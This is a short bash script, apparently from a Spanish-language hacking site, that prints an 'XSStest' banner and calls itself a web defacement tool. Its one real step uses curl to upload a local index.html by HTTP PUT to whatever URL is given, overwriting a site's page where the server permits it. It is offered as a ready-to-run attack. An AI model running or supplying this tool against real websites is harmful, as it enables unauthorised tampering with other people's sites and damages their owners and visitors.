#!/bin/bash

Normal=$(echo 'printf' '\033[39m')
Verde=$(echo 'printf' '\033[32m')
Blanco=$(echo 'printf' '\033[0m')

$Verde
cat << "INFO"
    __   __ _____ _____ _            _
    \ \ / // ____/ ____| |          | |
     \ V /| (___| (___ | |_ ___  ___| |_
      > <  \___ \\___ \| __/ _ \/ __| __|
     / . \ ____) |___) | ||  __/\__ \ |_
    /_/ \_\_____/_____/ \__\___||___/\__| Beta
INFO
$Blanco
echo "                  hackingyseguridad.com"
echo
$Blanco
if [ -z "$1" ]; then
        echo "Web defacement. "
        echo "Uso: sh $0 <URL>"
        exit 0
fi

echo
curl -T index.html $1
